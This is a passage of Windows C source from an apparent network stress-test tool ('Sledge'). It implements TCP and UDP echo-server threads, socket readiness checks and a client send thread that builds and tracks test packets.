        return FALSE;
    }

    // There is pending data or a pending connection
    return TRUE;
}

//==================================================================================
// WaitForReadableSocket
//----------------------------------------------------------------------------------
//
// Description: Used to determine when a non-blocking socket is readable
//
// Arguments:
//  SOCKET      sockServ        Socket to examine for readability
// Returns:
//  TRUE if the socket is writeable, otherwise FALSE
//==================================================================================
BOOL WaitForReadableSocket(SOCKET sockServ)
{
    FD_SET  readfds;
    INT     iRet;

    if(sockServ == INVALID_SOCKET)
        return FALSE;

    // Clear all the FD_SET structures
    FD_ZERO(&readfds);
    FD_SET(sockServ, &readfds);

    // Do a blocking select
    if((iRet = select( 0, &readfds, NULL, NULL, NULL)) == SOCKET_ERROR)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[]: select() error %s", GetLastErrorText());
        return FALSE;
    }

    // If select returned but didn't fill any of the FD_SET structures, something is wrong
    if(!iRet)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[]: select() didn't return any sockets\r\n");
        return FALSE;
    }

    // If the socket isn't ready for reading, then something else must have happened... This is a failure.
    if(!FD_ISSET(sockServ, &readfds))
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[]: reading socket failed\r\n");
        return FALSE;
    }

    // There is pending data or a pending connection
    return TRUE;
}

//==================================================================================
// TCPServThread
//----------------------------------------------------------------------------------
//
// Description: Thread that handles incoming connetions from TCP client tests
//
// Arguments:
//  LPVOID      *Parm           Just needed because this is a thread proc
// Returns:
//  always 0
//==================================================================================
DWORD WINAPI TCPServThread(LPVOID *pParm)
{
    SOCKADDR_IN ServSockAddr = { AF_INET };
    SOCKADDR_IN PeerSockAddr;
    int         sizeofSockAddr;

    SOCKET      NewSock = INVALID_SOCKET;

    HANDLE      hThread;
    DWORD       dwThreadId;
    ULONG       uNonBlockParam = TRUE;

    int         iConn;

    SledgeLog(g_hLog, XLL_INFO, "TCP server thread started");

    // Set the local socket parameters
    memset(&ServSockAddr, 0, sizeof(struct sockaddr));
    ServSockAddr.sin_port        = htons(TCP_SERV_PORT);
    ServSockAddr.sin_addr.s_addr = INADDR_ANY;
    ServSockAddr.sin_family = AF_INET;

    // Create the socket
    if ((g_sTCPServer = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: socket() failed %s\r\n", CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
        SignalTestExit(0);
        goto DONE;
    }

    // If necessary, set the socket for non-blocking IO
    if(g_fNonBlocking)
    {
        if(ioctlsocket(g_sTCPServer, FIONBIO, &uNonBlockParam) == SOCKET_ERROR)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: ioctlsocket() error %s while setting to non-blocking",
                CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
            SignalTestExit(0);
            goto DONE;
        }
    }

    // Bind the socket to the local address
    if (bind(g_sTCPServer, (const struct sockaddr *) &ServSockAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: bind() error %s", CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
        SignalTestExit(0);
        goto DONE;
    }

    // Set the socket for accepting incoming connections
    if (listen(g_sTCPServer, SERV_BACKLOG) == SOCKET_ERROR)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: listen() error %s\r\n", CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
        SignalTestExit(0);
        goto DONE;
    }

    while(1)
    {
        // Initialize the incoming address information
        sizeofSockAddr = sizeof(SOCKADDR_IN);
        memset(&PeerSockAddr, 0, sizeof (struct sockaddr));
        PeerSockAddr.sin_family = AF_INET;

        // Accept the pending connection
        if ((NewSock = accept(g_sTCPServer, (struct sockaddr *) &PeerSockAddr, &sizeofSockAddr)) == INVALID_SOCKET)
        {
            if(g_fNonBlocking)
            {
                // If we are using a non-blocking socket and the socket would have blocked, wait for incoming connections
                if(WSAGetLastError() == WSAEWOULDBLOCK)
                {
                    if(!WaitForReadableSocket(g_sTCPServer))
                    {
                        SignalTestExit(0);
                        goto DONE;
                    }

                    if ((NewSock = accept(g_sTCPServer, (struct sockaddr *) &PeerSockAddr, &sizeofSockAddr)) == INVALID_SOCKET)
                    {
                        SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: accept() error %s (after select returned success!)",
                            CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
                        SignalTestExit(0);
                        goto DONE;
                    }

                }
            }
            else
            {
                SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: accept() error %s", CONN_TYPES_Str[CONN_TCP], GetLastErrorText());
                SignalTestExit(0);
                goto DONE;
            }
        }

        EnterCriticalSection(&g_csSledgeCritSection);

        for (iConn = 0; iConn < MAX_SERV_CONNS; iConn++)
        {
            if (g_scServConns[iConn].ConnType == CONN_IDLE)
                break;
        }

        if (g_scServConns[iConn].ConnType != CONN_IDLE)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: g_scServConns[iConn].ConnType != CONN_IDLE");
            SignalTestExit(0);
            goto DONE;
        }

        g_iServConns++;

        g_scServConns[iConn].ConnType         = CONN_TCP;
        g_scServConns[iConn].Sock             = NewSock;
        g_scServConns[iConn].PacketLenMin     = 9999;
        g_scServConns[iConn].PacketLenMax     = 0;
        g_scServConns[iConn].TotalPacketsLoop = 0;
        g_scServConns[iConn].TotalBytesLoop   = 0;
        g_scServConns[iConn].DeltaBytesLoop   = 0;
        g_scServConns[iConn].SleepyRecv       = FALSE;
        g_scServConns[iConn].InSend           = FALSE;
        g_scServConns[iConn].InRecv           = FALSE;
        g_scServConns[iConn].InClose          = FALSE;
        g_scServConns[iConn].SendInProgress   = 0;
        g_scServConns[iConn].RecvInProgress   = 0;

        LeaveCriticalSection(&g_csSledgeCritSection);

        if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ServRecvThread, &g_scServConns[iConn], 0, &dwThreadId)) == NULL)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: CreateThread(ServRecvThread) failed %d",
                iConn,
                CONN_TYPES_Str[g_scServConns[iConn].ConnType],
                GetLastError());

            SignalTestExit(0);
            goto DONE;
        }

        CloseHandle(hThread);
    }

DONE:

    return(0);
}

//==================================================================================
// UDPServThread
//----------------------------------------------------------------------------------
//
// Description: Thread that handles incoming connections from UDP client tests
//
// Arguments:
//  LPVOID      *Parm           Just needed because this is a thread proc
// Returns:
//  always 0
//==================================================================================
DWORD WINAPI UDPServThread(LPVOID *pParm)
{
    SOCKADDR_IN ServSockAddr = { AF_INET };

    HANDLE      hThread;
    DWORD       dwThreadId;
    ULONG       uNonBlockParam = TRUE;

    int         iConn;

    SledgeLog(g_hLog, XLL_INFO, "UDP server thread started");

    // Set the local socket parameters
    memset(&ServSockAddr, 0, sizeof(struct sockaddr));
    ServSockAddr.sin_port        = htons(UDP_SERV_PORT);
    ServSockAddr.sin_addr.s_addr = INADDR_ANY;
    ServSockAddr.sin_family = AF_INET;

    // Create the socket
    if ((g_sUDPServer = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: socket() failed %s", CONN_TYPES_Str[CONN_UDP], GetLastErrorText());
        SignalTestExit(0);
        goto DONE;
    }

    // If necessary, set the socket for non-blocking IO
    if(g_fNonBlocking)
    {
        if(ioctlsocket(g_sUDPServer, FIONBIO, &uNonBlockParam) == SOCKET_ERROR)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: ioctlsocket() error %s while setting to non-blocking",
                CONN_TYPES_Str[CONN_UDP], GetLastErrorText());
            SignalTestExit(0);
            goto DONE;
        }
    }

    // Bind the socket to the local address
    if (bind(g_sUDPServer, (const struct sockaddr *) &ServSockAddr, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: bind() error %s", CONN_TYPES_Str[CONN_UDP], GetLastErrorText());
        SignalTestExit(0);
        goto DONE;
    }

    EnterCriticalSection(&g_csSledgeCritSection);

    for (iConn = 0; iConn < MAX_SERV_CONNS; iConn++)
    {
        if (g_scServConns[iConn].ConnType == CONN_IDLE)
            break;
    }

    if (g_scServConns[iConn].ConnType != CONN_IDLE)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: g_scServConns[iConn].ConnType != CONN_IDLE");
        SignalTestExit(0);
        goto DONE;
    }

    g_iServConns++;

    g_scServConns[iConn].ConnType         = CONN_UDP;
    g_scServConns[iConn].Sock             = g_sUDPServer;
    g_scServConns[iConn].PacketLenMin     = 9999;
    g_scServConns[iConn].PacketLenMax     = 0;
    g_scServConns[iConn].TotalPacketsLoop = 0;
    g_scServConns[iConn].TotalBytesLoop   = 0;
    g_scServConns[iConn].DeltaBytesLoop   = 0;
    g_scServConns[iConn].SleepyRecv       = FALSE;
    g_scServConns[iConn].InSend           = FALSE;
    g_scServConns[iConn].InRecv           = FALSE;
    g_scServConns[iConn].InClose          = FALSE;
    g_scServConns[iConn].SendInProgress   = 0;
    g_scServConns[iConn].RecvInProgress   = 0;

    LeaveCriticalSection(&g_csSledgeCritSection);

    if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ServRecvThread, &g_scServConns[iConn], 0, &dwThreadId)) == NULL)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: CreateThread(ServRecvThread) failed %d",
            iConn, CONN_TYPES_Str[g_scServConns[iConn].ConnType],
            GetLastError());

        SignalTestExit(0);
        goto DONE;
    }

    CloseHandle(hThread);

DONE:

    return(0);
}

//==================================================================================
// ServRecvThread
//----------------------------------------------------------------------------------
//
// Description: Thread that handles receiving and echoing data back to client tests
//
// Arguments:
//  LPVOID      *Parm           Pointer to the SERV_CONNS struct for this server
// Returns:
//  always 0
//==================================================================================
DWORD WINAPI ServRecvThread(LPVOID *pParm)
{
    SERV_CONNS *pConn = (SERV_CONNS *) pParm;

    char *Packet;
    ULONG  BytesRead, BytesSent;
    ULONG  TotalBytesSent;
    int PeerLen = sizeof(SOCKADDR_IN);

    BOOL ExpectedErrorExit = FALSE;
    BOOL EOFRcvd = FALSE;
    SOCKADDR_IN   PeerSockAddr;

    // Allocate and initialize the packet buffer
    Packet = (char *) LocalAlloc(LPTR, PACKET_MAX_LEN);
    memset(&PeerSockAddr, 0, sizeof(SOCKADDR_IN));
    if (NULL == Packet)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: unable to allocate packet", pConn->Index, CONN_TYPES_Str[pConn->ConnType]);

        SignalTestExit(0);
        goto ExitServRecvThread;
    }

    while(1)
    {
        switch(pConn->ConnType)
        {
        case CONN_TCP:
            // Randomly determine if we should do a sleepy receive
            if (RandomRange(0, 99) < (ULONG) g_SledgeParms.ServSleepyRecvs)
            {
                pConn->SleepyRecv = TRUE;
                Sleep(SLEEP_BEFORE_RECV_MS);
            }

            pConn->InRecv = TRUE;

            if ((BytesRead = recv(pConn->Sock, (char *) Packet, g_SledgeParms.ServRecvLen, 0)) == SOCKET_ERROR)
            {
                //If this is a non-blocking socket and the recv completes asynchornously, then this isn't an error
                if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
                {

                    if(WaitForReadableSocket(pConn->Sock))
                    {

                        if((BytesRead = recv(pConn->Sock,(char *) Packet,g_SledgeParms.ServRecvLen,0)) != SOCKET_ERROR)
                        {
                            goto TCPReadOK;
                        }
                    }
                }

                // If there was another blocking operation, we have to go back and try again
                if(WSAGetLastError() == WSAEINPROGRESS)
                {
                    if(!pConn->InSend)
                        SledgeLog(g_hLog, XLL_WARN, "Socket is already blocking, but we aren't sending: RecvInProgress %d, SendInProgress %d"
                        ,pConn->RecvInProgress, pConn->SendInProgress);

                    pConn->RecvInProgress = pConn->RecvInProgress + 1;
                    pConn->InRecv = FALSE;
                    Sleep(100);
                    continue;
                }


                pConn->InRecv = FALSE;

                // If we are using in flight closes
                if (g_SledgeParms.InFlightCloses)
                {
                    // If this wasn't caused by the HatchetThread, then exit
                    if (GetLastError() != WSAECONNRESET && GetLastError() != WSAECONNABORTED && GetLastError() != WSAEINVAL)
                    {
                        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() failed %s",
                            pConn->Index,
                            CONN_TYPES_Str[pConn->ConnType],
                            GetLastErrorText());

                        SignalTestExit(0);
                        goto ExitServRecvThread;
                    }
                    // If this was caused by the HatchetThread, handle it the error gracefully
                    else
                    {
                        SledgeLog(g_hLog, XLL_INFO, "Sledge[%d,%s]: ServRecvThread exiting on expected error %s",
                            pConn->Index,
                            CONN_TYPES_Str[pConn->ConnType],
                            GetLastErrorText());

                        ExpectedErrorExit = TRUE;
                        goto ExitServRecvThread;
                    }
                }
                else
                {
                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() failed %s",
                        pConn->Index,
                        CONN_TYPES_Str[pConn->ConnType],
                        GetLastErrorText());

                    SignalTestExit(0);
                    goto ExitServRecvThread;
                }
            }

            // The recv succeeded
TCPReadOK:
            pConn->InRecv = FALSE;

            if (BytesRead == 0)
            {
                ExpectedErrorExit = FALSE;
                SledgeLog(g_hLog, XLL_INFO, "Sledge[%d,%s]: ServRecvThread recv returned 0 bytes", pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                goto ExitServRecvThread;
            }

            if (Packet[BytesRead - 1] == 0x1A)
            {
                EOFRcvd = TRUE;
                BytesRead--;
            }

            TotalBytesSent = 0;
            while(TotalBytesSent < BytesRead)
            {
                BytesSent = 0;
                pConn->InSend = TRUE;

                if ((BytesSent = send(pConn->Sock, (char *) Packet + TotalBytesSent, BytesRead - TotalBytesSent, 0)) == SOCKET_ERROR)
                {
                    if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
                    {

                        Sleep(100);
                        continue;
                    }

                    // If there was another blocking operation, we have to go back and try again
                    if(WSAGetLastError() == WSAEINPROGRESS)
                    {
                        if(!pConn->InRecv)
                            SledgeLog(g_hLog, XLL_WARN, "Socket is already blocking, but we aren't recving: RecvInProgress %d, SendInProgress %d"
                            ,pConn->RecvInProgress, pConn->SendInProgress);

                        pConn->SendInProgress = pConn->SendInProgress + 1;
                        pConn->InSend = FALSE;
                        Sleep(100);
                        continue;
                    }

                    pConn->InSend = FALSE;

                    // If we are using in flight closes
                    if (g_SledgeParms.InFlightCloses)
                    {
                        // If this wasn't caused by the HatchetThread, then exit
                        if (GetLastError() != WSAECONNRESET &&
                            GetLastError() != WSAEDISCON &&
                            GetLastError() != WSAECONNABORTED &&
                            GetLastError() != WSAEINVAL)
                        {
                            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: send() failed %s",
                                pConn->Index,
                                CONN_TYPES_Str[pConn->ConnType],
                                GetLastErrorText());

                            SignalTestExit(0);
                            goto ExitServRecvThread;
                        }
                        // If this was caused by the HatchetThread, handle it the error gracefully
                        else
                        {
                            SledgeLog(g_hLog, XLL_INFO, "Sledge[%d,%s]: ServRecvThread exiting on expected error %s",
                                pConn->Index,
                                CONN_TYPES_Str[pConn->ConnType],
                                GetLastErrorText());

                            ExpectedErrorExit = TRUE;
                            goto ExitServRecvThread;
                        }
                    }
                    else
                    {
                        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: send() failed %s",
                            pConn->Index,
                            CONN_TYPES_Str[pConn->ConnType],
                            GetLastErrorText());

                        SignalTestExit(0);
                        goto ExitServRecvThread;
                    }
                }

                pConn->InSend = FALSE;
                TotalBytesSent += BytesSent;
            }

            if (TotalBytesSent != BytesRead)
            {
                SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: TotalBytesSent != BytesRead", pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                SignalTestExit(0);
                goto ExitServRecvThread;
            }


            if (EOFRcvd)
            {
                ExpectedErrorExit = FALSE;
                goto ExitServRecvThread;
            }

            EnterCriticalSection(&g_csSledgeCritSection);

            pConn->PacketLenMin = MIN(pConn->PacketLenMin, (int) BytesRead);
            pConn->PacketLenMax = MAX(pConn->PacketLenMax, (int) BytesRead);

            pConn->TotalPacketsLoop++;
            pConn->TotalBytesLoop += BytesRead;
            pConn->DeltaBytesLoop += BytesRead;

            LeaveCriticalSection(&g_csSledgeCritSection);
            break;

            //Added UDP support... - TBJ 7/29/98
          case CONN_UDP:
              if (RandomRange(0, 99) < SERV_PERCENT_SLEEPY_RECVS)
              {
                  pConn->SleepyRecv = TRUE;

                  Sleep(SLEEP_BEFORE_RECV_MS);
              }


RECV:

              pConn->InRecv = TRUE;

              //Since we are dealing with datagrams that can be of any size, we
              //ignore the server receive length since this might cause us to
              //cut datagrams into pieces and lose data... instead we set the
              //receive length to the maximum value... we also capture the address
              //of the socket which sent this data
              if ((BytesRead =
                  recvfrom(pConn->Sock, Packet, PACKET_MAX_LEN, 0, (struct sockaddr *) &PeerSockAddr, &PeerLen))
                  == SOCKET_ERROR)
              {
                  //If this is a non-blocking socket and the recvfrom completes asynchronously, then this isn't an error
                  if(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
                  {
                      if(WaitForReadableSocket(pConn->Sock))
                      {
                          if((BytesRead =
                              recvfrom(pConn->Sock, Packet, PACKET_MAX_LEN, 0, (struct sockaddr *) &PeerSockAddr, &PeerLen))
                              != SOCKET_ERROR)
                          {
                              goto UDPReadOK;
                          }
                      }
                  }

                  // If there was another blocking operation, we have to go back and try again
                  if(WSAGetLastError() == WSAEINPROGRESS)
                  {
                      if(!pConn->InSend)
                          SledgeLog(g_hLog, XLL_WARN, "Socket is already blocking, but we aren't sending: RecvInProgress %d, SendInProgress %d"
                          ,pConn->RecvInProgress, pConn->SendInProgress);

                      pConn->RecvInProgress = pConn->RecvInProgress + 1;
                      pConn->InRecv = FALSE;
                      Sleep(100);
                      goto RECV;
                  }

                  pConn->InRecv = FALSE;

                  if (g_SledgeParms.InFlightCloses)
                  {
                      if (GetLastError() != WSAECONNRESET &&
                          GetLastError() != WSAECONNABORTED &&
                          GetLastError() != WSAEINVAL)
                      {
                          SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() failed %s",
                              pConn->Index,
                              CONN_TYPES_Str[pConn->ConnType],
                              GetLastErrorText());

                          SignalTestExit(0);
                          goto ExitServRecvThread;
                      }
                      else
                      {
                          ExpectedErrorExit = TRUE;
                          goto ExitServRecvThread;
                      }
                  }
                  else
                  {
                      SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: recv() failed %s",
                          pConn->Index,
                          CONN_TYPES_Str[pConn->ConnType],
                          GetLastErrorText());

                      SignalTestExit(0);
                      goto ExitServRecvThread;
                  }
              }

              // The recvfrom succeeded
UDPReadOK:
              pConn->InRecv = FALSE;

              if (BytesRead == 0)
              {
                  ExpectedErrorExit = FALSE;
                  goto ExitServRecvThread;
              }

              if (Packet[BytesRead - 1] == 0x1A)
              {
                  EOFRcvd = TRUE;
                  BytesRead--;
              }

              // DumpMem(Packet, BytesRead);

SEND:
              pConn->InSend = TRUE;

              if ((BytesSent = sendto(pConn->Sock, Packet, BytesRead, 0,
                  (const struct sockaddr *) &PeerSockAddr, PeerLen))
                  == SOCKET_ERROR)
              {

                    //Wait for 100ms between sendto attempts...
                  while(g_fNonBlocking && (WSAGetLastError() == WSAEWOULDBLOCK))
                  {
                      if ((BytesSent =
                          sendto(pConn->Sock,Packet,BytesRead,0,(const struct sockaddr *)&PeerSockAddr,PeerLen))
                          != SOCKET_ERROR)
                      {
                          if(BytesSent < BytesRead)
                          {
                              SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: sendto() sent a UDP fragment!",
                                  pConn->Index,
                                  CONN_TYPES_Str[pConn->ConnType]);

                              SignalTestExit(0);
                              goto ExitServRecvThread;
                          }

                          goto UDPWriteOK;
                      }

                      Sleep(100);
                  }

                  // If there was another blocking operation, we have to go back and try again
                  if(WSAGetLastError() == WSAEINPROGRESS)
                  {
                      if(!pConn->InRecv)
                        SledgeLog(g_hLog, XLL_WARN, "Socket is already blocking, but we aren't recving: RecvInProgress %d, SendInProgress %d"
                        ,pConn->RecvInProgress, pConn->SendInProgress);

                      pConn->SendInProgress = pConn->SendInProgress + 1;
                      pConn->InSend = FALSE;
                      Sleep(100);
                      goto SEND;
                  }

                  pConn->InSend = FALSE;

                  if (g_SledgeParms.InFlightCloses)
                  {
                      if (GetLastError() != WSAECONNRESET &&
                          GetLastError() != WSAEDISCON &&
                          GetLastError() != WSAECONNABORTED &&
                          GetLastError() != WSAEINVAL)
                      {
                          SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: send() failed %s",
                              pConn->Index,
                              CONN_TYPES_Str[pConn->ConnType],
                              GetLastErrorText());

                          SignalTestExit(0);
                          goto ExitServRecvThread;
                      }
                      else
                      {
                          ExpectedErrorExit = TRUE;
                          goto ExitServRecvThread;
                      }
                  }
                  else
                  {
                      SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: send() failed %s",
                          pConn->Index,
                          CONN_TYPES_Str[pConn->ConnType],
                          GetLastErrorText());

                      SignalTestExit(0);
                      goto ExitServRecvThread;
                  }
              }

// The sendto succeeded
UDPWriteOK:

              pConn->InSend = FALSE;

              if (BytesSent != BytesRead)
              {
                  SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: BytesSent != BytesRead", pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                  SignalTestExit(0);
                  goto ExitServRecvThread;
              }


              if (EOFRcvd)
              {
                  ExpectedErrorExit = FALSE;
                  goto ExitServRecvThread;
              }

              EnterCriticalSection(&g_csSledgeCritSection);

              pConn->PacketLenMin = (int) MIN((ULONG) pConn->PacketLenMin, BytesRead);
              pConn->PacketLenMax = (int) MAX((ULONG) pConn->PacketLenMax, BytesRead);

              if((pConn->TotalBytesLoop + BytesRead) >= ROLLOVER_LIMIT)
              {
                  pConn->TotalPacketsLoop = 1;
                  pConn->TotalBytesLoop = BytesRead;
                  pConn->DeltaBytesLoop = BytesRead;
              }
              else
              {
                  pConn->TotalPacketsLoop++;
                  pConn->TotalBytesLoop += BytesRead;
                  pConn->DeltaBytesLoop += BytesRead;
              }

              LeaveCriticalSection(&g_csSledgeCritSection);
              break;
        }
    }

ExitServRecvThread:

    pConn->InClose = TRUE;

    if (closesocket(pConn->Sock) == SOCKET_ERROR)
    {
        pConn->InClose = FALSE;

        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: closesocket() error %s",
            pConn->Index,
            CONN_TYPES_Str[pConn->ConnType],
            GetLastErrorText());

        SignalTestExit(0);

    }

    pConn->InClose = FALSE;

    EnterCriticalSection(&g_csSledgeCritSection);

    g_iServConns--;

    pConn->ConnType = CONN_IDLE;

    LeaveCriticalSection(&g_csSledgeCritSection);

    LocalFree (Packet);

    return(0);
}

//==================================================================================
// ClientSendThread
//----------------------------------------------------------------------------------
//
// Description: Thread that handles sending data to the server
//
// Arguments:
//  LPVOID      *Parm           Pointer to the CLIENT_CONNS struct for this client
// Returns:
//  always 0
//==================================================================================
DWORD WINAPI ClientSendThread(LPVOID *pParm)
{
    CLIENT_CONNS *pConn = (CLIENT_CONNS *) pParm;
    BOOL  SocketClosed  =  FALSE;
    BYTE *Packet;

    int   Reps, Len;

//  SledgeLog(g_hLog, XLL_INFO, "Client send thread started");

    Packet = (BYTE *) LocalAlloc(LPTR, PACKET_MAX_LEN);

    if (NULL == Packet)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: unable to allocate packet",
            pConn->Index, CONN_TYPES_Str[pConn->ConnType]);

        SignalTestExit(0);
        goto DONE;
    }

    for (Reps = 0; Reps < g_SledgeParms.PacketsPerConn && ! SocketClosed; Reps++)
    {
        EnterCriticalSection(&g_csSledgeCritSection);

        if(pConn->ConnType != CONN_UDP)
            Len = RandomRange(g_SledgeParms.TCPMinPacketLen, g_SledgeParms.TCPMaxPacketLen);
        else
            Len = RandomRange(g_SledgeParms.UDPMinPacketLen, g_SledgeParms.UDPMaxPacketLen);

        pConn->PacketsOut[pConn->PacketsOutHead].Len = Len;

        pConn->PacketsOut[pConn->PacketsOutHead].CheckSum =
            BuildTestPacket(pConn, Len, Packet, Reps);

        pConn->PacketsOut[pConn->PacketsOutHead].Index = Reps;

        LeaveCriticalSection(&g_csSledgeCritSection);

//      SledgeLog(g_hLog, XLL_INFO, "Generated packet %d containing %d bytes", Reps, Len);

        switch(pConn->ConnType)
        {
        case CONN_TCP:
            // If we don't do this... we could flood the other side
            while(pConn->TotalBytesOut >= (pConn->TotalBytesIn + 20000))
                Sleep(100);

            if (SendPacketSTREAM(pConn, Len, Packet) != 0)
                SocketClosed = TRUE;
            break;
        case CONN_UDP:
            if (SendPacketDGRAM(pConn, Len, Packet) != 0)
                SocketClosed = TRUE;
            break;
        default:
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: invalid connection type",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
            SignalTestExit(0);
            goto DONE;
        }

        if (!SocketClosed)
        {
            EnterCriticalSection(&g_csSledgeCritSection);

            pConn->PacketLenMin = MIN(pConn->PacketLenMin, Len);
            pConn->PacketLenMax = MAX(pConn->PacketLenMax, Len);

            pConn->TotalPacketsOut++;
            pConn->TotalBytesOut += Len;
            pConn->DeltaBytesOut += Len;

            pConn->PacketsOutHead = (pConn->PacketsOutHead + 1) %
                MAX_PACKETS_IN_FLIGHT;
            pConn->PacketsOutCount++;

            if (pConn->PacketsOutHead == pConn->PacketsOutTail)
            {
                SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: pConn->PacketsOutHead == pConn->PacketsOutTail",
                    pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
                SignalTestExit(0);
                LeaveCriticalSection(&g_csSledgeCritSection);
                goto DONE;
            }

            LeaveCriticalSection(&g_csSledgeCritSection);
        }

        if((pConn->ConnType == CONN_UDP) && (Reps < g_SledgeParms.PacketsPerConn))
            Sleep(g_SledgeParms.UDPSleepBeforeNext);

//      SledgeLog(g_hLog, XLL_INFO, "Signalling receive thread");

        if (SetEvent(pConn->hPacketsOutEvent) != TRUE)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: SetEvent(hPacketsOutEvent) failed %d",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                GetLastError());
        }

    }

    if (SocketClosed)
    {
        EnterCriticalSection(&g_csSledgeCritSection);

        if (pConn->RecvThreadDown)
            CloseConn(pConn);

        pConn->SendThreadDown = TRUE;

        pConn->PacketsOut[pConn->PacketsOutHead].Len = -1;

        pConn->PacketsOutHead = (pConn->PacketsOutHead + 1) %
            MAX_PACKETS_IN_FLIGHT;

        // UDP shouldn't increment the number of packets out on send thread exit
        if(pConn->ConnType != CONN_UDP)
            pConn->PacketsOutCount++;

        if (pConn->PacketsOutHead == pConn->PacketsOutTail)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: pConn->PacketsOutHead == pConn->PacketsOutTail",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
            SignalTestExit(0);
            LeaveCriticalSection(&g_csSledgeCritSection);
            goto DONE;
        }

        LeaveCriticalSection(&g_csSledgeCritSection);

        if (SetEvent(pConn->hPacketsOutEvent) != TRUE)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: SetEvent(hPacketsOutEvent) failed %d",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                GetLastError());
        }

        SetEvent(g_hCreateThreadsEvent);
    }
    else
    {
        switch(pConn->ConnType)
        {
        case CONN_TCP:
            Packet[0] = 0x1A;
            if (SendPacketSTREAM(pConn, 1, Packet) != 0)
                SocketClosed = TRUE;
            break;
        case CONN_UDP:
            break;
        default:
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: invalid connection type",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
            SignalTestExit(0);
            goto DONE;
        }

        EnterCriticalSection(&g_csSledgeCritSection);

        pConn->SendThreadDown = TRUE;

        pConn->PacketsOut[pConn->PacketsOutHead].Len = -1;

        pConn->PacketsOutHead = (pConn->PacketsOutHead + 1) %
            MAX_PACKETS_IN_FLIGHT;

        // UDP shouldn't increment the number of packets out on send thread exit
        if(pConn->ConnType != CONN_UDP)
            pConn->PacketsOutCount++;

        if (pConn->PacketsOutHead == pConn->PacketsOutTail)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: pConn->PacketsOutHead == pConn->PacketsOutTail",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType]);
            SignalTestExit(0);
            LeaveCriticalSection(&g_csSledgeCritSection);
            goto DONE;
        }

        LeaveCriticalSection(&g_csSledgeCritSection);

        SledgeLog(g_hLog, XLL_INFO, "Send thread complete. RecvInProgress %d, SendInProgress %d",
            pConn->RecvInProgress, pConn->SendInProgress);

        if (SetEvent(pConn->hPacketsOutEvent) != TRUE)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: SetEvent(hPacketsOutEvent) failed %d",
                pConn->Index, CONN_TYPES_Str[pConn->ConnType],
                GetLastError());
        }

    }

DONE:

    LocalFree (Packet);

    return(0);
}

//==================================================================================
// ClientRecvThread
//----------------------------------------------------------------------------------
//
// Description: Thread that handles receiving data from the server
//
// Arguments:
//  LPVOID      *Parm           Pointer to the CLIENT_CONNS struct for this client
// Returns:
//  always 0
//==================================================================================
DWORD WINAPI ClientRecvThread(LPVOID *pParm)
{
    CLIENT_CONNS *pConn = (CLIENT_CONNS *) pParm;
    BOOL  SocketClosed  =  FALSE, TimedOut;

